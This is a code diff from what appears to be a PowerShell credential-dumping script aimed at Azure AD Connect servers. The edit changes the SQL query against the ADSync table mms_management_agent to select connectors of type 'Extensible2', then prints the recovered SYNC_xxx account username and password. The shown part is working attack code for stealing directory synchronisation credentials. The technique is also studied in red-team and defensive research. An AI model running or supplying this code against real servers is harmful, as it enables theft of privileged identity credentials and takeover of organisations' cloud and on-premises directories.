@@ -49,11 +49,11 @@ Username: $($username.Username)
 Password: $($password.Password)
 "@
 
-# ===== EXTRACT SYNC_xxx (Azure AD Connector) =====
+# ===== EXTRACT SYNC_xxx (Extensible2 / Azure AD Connector) =====
 Write-Host "`n=== SYNC_xxx Account (Azure AD Connector) ==="
 
 $cmd = $client.CreateCommand()
-$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'Windows Azure AD'"
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'Extensible2'"
 $reader = $cmd.ExecuteReader()
 
 if ($reader.Read()) {
@@ -78,7 +78,7 @@ Password: $($sync_password.Password)
 "@
 }
 else {
-    Write-Host "No Azure AD connector found"
+    Write-Host "No Extensible2 connector found"
     $sync_creds = "`n=== SYNC_xxx CREDENTIALS ===`nNot found"
     $reader.Close()
 }
